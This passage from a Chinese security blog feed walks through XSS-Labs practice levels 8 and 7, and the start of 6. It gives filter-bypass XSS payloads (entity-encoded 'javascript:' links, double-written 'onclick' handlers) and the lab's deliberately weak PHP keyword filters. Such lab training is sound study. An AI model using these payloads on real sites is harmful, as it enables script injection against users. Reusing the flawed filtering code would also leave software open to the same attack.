href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level8</title>
      <link href="/2020/10/26/xss-zhi-xss-labs-level8/"/>
      <url>/2020/10/26/xss-zhi-xss-labs-level8/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页或浏览该页面中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。</p><p>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level8/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level8<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level8/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>input</code>标签中参数的尖括号进行了转义，而对<code>a</code>标签参数中的<code>script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>进行转义，但使用HTML实体编码可以正常弹框，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript"># HTML实体编码<span class="token operator">+</span>URL编码http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level8<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span>javasc<span class="token operator">%</span><span class="token number">26</span><span class="token operator">%</span><span class="token number">2382</span><span class="token operator">%</span>3bipt<span class="token operator">%</span><span class="token number">3</span><span class="token function">aalert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level8/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level9.php?keyword=not bad!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level8<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level8<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span> <span class="token function">strtolower</span><span class="token punctuation">(</span><span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">"scr_ipt"</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">"o_n"</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">"sr_c"</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">"da_ta"</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">"hr_ef"</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str7</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">'"'</span><span class="token punctuation">,</span><span class="token string">'&amp;quot'</span><span class="token punctuation">,</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> '<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level8.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>GET</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.htmlspecialchars($str).<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>添加友情链接</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">'&lt;center>&lt;BR>&lt;a href="'</span><span class="token punctuation">.</span><span class="token variable">$str7</span><span class="token punctuation">.</span><span class="token string">'">友情链接&lt;/a>&lt;/center>'</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level8.jpg</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str7</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由26行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li><li>由17-23、32行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的<code>script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>进行转换后赋值给<code>a</code>标签的<code>href</code>值。</li></ul></li><li><p>所以含有的<code>script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>(无论大小写)的注入无效，但其他使用HTML实体编码构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序对参数中的<code>script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>等关键字进行转义后将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"># 编码绕过关键字过滤javasc<span class="token operator">&amp;</span>#<span class="token number">82</span><span class="token punctuation">;</span>ipt<span class="token punctuation">:</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level7</title>
      <link href="/2020/10/26/xss-zhi-xss-labs-level7/"/>
      <url>/2020/10/26/xss-zhi-xss-labs-level7/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该页或请求该网页中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。<br>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level7/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level7<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level7/注入点检测.png" alt="注入点检测"></center><p>由上述操作可以推断，程序对<code>h2</code>标签中参数的尖括号进行了转义，而对<code>name=keyword</code>的<code>input</code>标签中的<code>script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>被过滤，但重写关键字就可以正常弹窗，所以此处存在XSS漏洞。</p></li><li><p>构造如下所示的payload进行漏洞测试，结果如下图所示。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level7<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token string">"+oonnclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span></code></pre><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level7/注入成功.png" alt="注入成功"></center></li><li><p>代码审计。程序源码如下所示：</p><pre class=" language-php"><code class="language-php"><span class="token markup"><span class="token doctype">&lt;!DOCTYPE html></span></span><span class="token markup"><span class="token comment" spellcheck="true">&lt;!--STATUS OK--></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>html</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>meta</span> <span class="token attr-name">http-equiv</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>content-type<span class="token punctuation">"</span></span> <span class="token attr-name">content</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span>text/html;charset<span class="token punctuation">=</span>utf-8<span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>script</span><span class="token punctuation">></span></span></span>window<span class="token punctuation">.</span>alert <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span>  <span class="token punctuation">{</span>     <span class="token function">confirm</span><span class="token punctuation">(</span><span class="token string">"完成的不错！"</span><span class="token punctuation">)</span><span class="token punctuation">;</span> window<span class="token punctuation">.</span>location<span class="token punctuation">.</span>href<span class="token operator">=</span><span class="token string">"level8.php?keyword=nice try!"</span><span class="token punctuation">;</span> <span class="token punctuation">}</span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>script</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>title</span><span class="token punctuation">></span></span></span>欢迎来到level7<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>title</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>head</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>h1</span> <span class="token attr-name">align</span><span class="token attr-value"><span class="token punctuation">=</span>center</span><span class="token punctuation">></span></span></span>欢迎来到level7<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>h1</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token function">ini_set</span><span class="token punctuation">(</span><span class="token string">"display_errors"</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str</span> <span class="token operator">=</span><span class="token function">strtolower</span><span class="token punctuation">(</span> <span class="token variable">$_GET</span><span class="token punctuation">[</span><span class="token string">"keyword"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str2</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"script"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str3</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"on"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str2</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str4</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"src"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str3</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str5</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"data"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str4</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$str6</span><span class="token operator">=</span><span class="token function">str_replace</span><span class="token punctuation">(</span><span class="token string">"href"</span><span class="token punctuation">,</span><span class="token string">""</span><span class="token punctuation">,</span><span class="token variable">$str5</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token string">"&lt;h2 align=center>没有找到和"</span><span class="token punctuation">.</span><span class="token function">htmlspecialchars</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"相关的结果.&lt;/h2>"</span><span class="token punctuation">.</span>'<span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>form</span> <span class="token attr-name">action</span><span class="token attr-value"><span class="token punctuation">=</span>level7.php</span> <span class="token attr-name">method</span><span class="token attr-value"><span class="token punctuation">=</span>GET</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>keyword</span>  <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span><span class="token punctuation">"</span><span class="token punctuation">'</span>.$str6.<span class="token punctuation">'</span><span class="token punctuation">"</span></span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>input</span> <span class="token attr-name">type</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">name</span><span class="token attr-value"><span class="token punctuation">=</span>submit</span> <span class="token attr-name">value</span><span class="token attr-value"><span class="token punctuation">=</span>搜索</span> <span class="token punctuation">/></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>form</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span>'<span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>center</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;</span>img</span> <span class="token attr-name">src</span><span class="token attr-value"><span class="token punctuation">=</span>level7.png</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>center</span><span class="token punctuation">></span></span></span><span class="token delimiter">&lt;?php</span> <span class="token keyword">echo</span> <span class="token string">"&lt;h3 align=center>payload的长度:"</span><span class="token punctuation">.</span><span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str6</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token string">"&lt;/h3>"</span><span class="token punctuation">;</span><span class="token delimiter">?></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>body</span><span class="token punctuation">></span></span></span><span class="token markup"><span class="token tag"><span class="token tag"><span class="token punctuation">&lt;/</span>html</span><span class="token punctuation">></span></span></span></code></pre><ul><li>由23行代码可知：GET方法得到的参数经过<code>htmlspecialchars()</code>函数转义后回显到HTML页面中。</li><li>由17-22、25行代码可知：程序将通过<strong>GET方法</strong>得到的参数中的<code>script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>进行过滤后赋值给<code>name=keyword</code>的<code>input</code>标签的<code>value</code>值。</li></ul></li><li><p>所以含有的<code>script</code>、<code>on</code>、<code>data</code>、<code>src</code>、<code>href</code>的注入无效，但其他双写构成的XSS仍可以使用。</p></li></ol><h1 id="0x05-实验分析"><a href="#0x05-实验分析" class="headerlink" title="0x05 实验分析"></a>0x05 实验分析</h1><ul><li><p>程序未做任何转义或过滤就将参数回显到HTML页面中，所以此关的payload非常多：</p><pre class=" language-javascript"><code class="language-javascript"># 重写绕过<span class="token string">"+oonnclick="</span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token operator">...</span></code></pre></li></ul><h1 id="0x06-参考链接"><a href="#0x06-参考链接" class="headerlink" title="0x06 参考链接"></a>0x06 参考链接</h1><ul><li><a href="https://www.jianshu.com/p/4fcb4b411a66" target="_blank" rel="noopener">跨站脚本漏洞基础讲解</a></li></ul>]]></content>
      
      
      <categories>
          
          <category> XSS </category>
          
      </categories>
      
      
        <tags>
            
            <tag> XSS </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>XSS之xss-labs-level6</title>
      <link href="/2020/10/26/xss-zhi-xss-labs-level6/"/>
      <url>/2020/10/26/xss-zhi-xss-labs-level6/</url>
      
        <content type="html"><![CDATA[<h1 id="0x01-XSS-Labs"><a href="#0x01-XSS-Labs" class="headerlink" title="0x01 XSS-Labs"></a>0x01 XSS-Labs</h1><p>&emsp;&emsp;XSS（跨站脚本攻击）是指恶意攻击者往Web页面里插入恶意<code>Script</code>代码，当用户浏览该网页或请求该网页中的内容之时，嵌入其中Web里面的<code>Script</code>代码会被执行，从而达到恶意攻击用户的目的。</p><p>&emsp;&emsp;XSS按照利用方式主要分为：反射型XSS、存储型XSS、DOM型XSS。<strong>反射型XSS</strong>是攻击者事先制作好攻击链接, 需要欺骗用户自己去点击链接才能触发XSS代码（服务器中没有这样的页面和内容），一般容易出现在搜索页面。代码是存储在服务器中的，如在个人信息或发表文章等地方，加入代码，如果没有过滤或过滤不严，那么这些代码将储存到服务器中，每当有用户访问该页面的时候都会触发代码执行，这种XSS即<strong>存储型XSS</strong>，非常危险，容易造成蠕虫，大量盗窃cookie。客户端的脚本程序可以通过DOM动态地检查和修改页面内容，它不依赖于提交数据到服务器端，而从客户端获得DOM中的数据在本地执行，如果DOM中的数据没有经过严格确认，就会产生<strong>DOM XSS漏洞</strong>。</p><p>&emsp;&emsp;XSS-Labs是使用PHP编写的一个XSS漏洞练习平台，一共包含20关，其主要为反射型XSS，可以练习基础XSS的过滤和绕过技巧，且每一关的后台源码都重写了<code>alert()</code>方法，只要成功弹框即可调用重写的<code>alert()</code>方法进入下一关或完成本关测试。</p><h1 id="0x02-实验工具"><a href="#0x02-实验工具" class="headerlink" title="0x02 实验工具"></a>0x02 实验工具</h1><ul><li><code>FireFox</code></li><li><code>HackBar</code></li></ul><h1 id="0x03-实验环境"><a href="#0x03-实验环境" class="headerlink" title="0x03 实验环境"></a>0x03 实验环境</h1><ul><li>服务器：Windows Server 2008</li><li>中间件：Apache</li><li>客户端：Windows 10</li></ul><p>实验界面如下图所示：</p><center><img src="https://gitee.com/jixiansiwei/ImagesBed/raw/master/Security/Pentest/XSS/xss-labs/level6/实验界面.png" alt="实验界面"></center><h1 id="0x04-实验步骤"><a href="#0x04-实验步骤" class="headerlink" title="0x04 实验步骤"></a>0x04 实验步骤</h1><ol><li><p>使用如下payload进行测试，查看参数的回显位置以及是否被转义或过滤。</p><pre class=" language-javascript"><code class="language-javascript">http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level6<span class="token punctuation">.</span>php<span class="token operator">?</span>keyword<span class="token operator">=</span><span class="token operator">&lt;</span>script<span class="token operator">></span><span class="token function">alert</span><span class="token punctuation">(</span><span class="token regex">/onclink+src+data+href/</span><span class="token punctuation">)</span><span class="token operator">&lt;</span><span class="token operator">/</span>script<span class="token operator">></span>http<span class="token punctuation">:</span><span class="token operator">/</span><span class="token operator">/</span><span class="token number">10.10</span><span class="token punctuation">.</span><span class="token number">10.148</span><span class="token punctuation">:</span><span class="token number">8203</span><span class="token operator">/</span>level6<span class="token 